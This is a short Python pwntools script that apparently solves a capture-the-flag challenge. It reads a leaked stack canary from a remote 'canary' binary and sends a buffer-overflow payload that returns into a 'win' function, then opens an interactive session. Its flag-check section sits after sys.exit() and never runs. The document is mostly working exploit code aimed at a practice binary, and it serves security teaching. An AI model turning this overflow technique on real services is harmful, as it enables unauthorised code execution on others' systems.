#!/usr/bin/env python3
from pwn import *
from time import sleep
import argparse
import sys

#### Setup
parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()

p = remote(args.host, args.port)

#### Exploit
context.binary = binary = './canary'
e = ELF(binary)

p.recvuntil('Stack canary: ')
canary = int(p.recvline().split(b' ')[0].decode(), 16)
log.info(f'Canary: {hex(canary)}')

payload = b'A' * 0x38
payload += p64(canary)
payload += p64(0)
payload += p64(e.symbols.win)

p.sendline(payload)

p.interactive()
sys.exit()

#### Flag check
resp = p.recvuntil(b'}').strip()

flag = resp.split(b'\n')[-1].split(b' ')[-1].decode()
if flag in open('flag.txt').read():
    log.success(f'SUCCESS: {flag}')
    sys.exit(0)

log.critical('Failed!')
sys.exit(1)
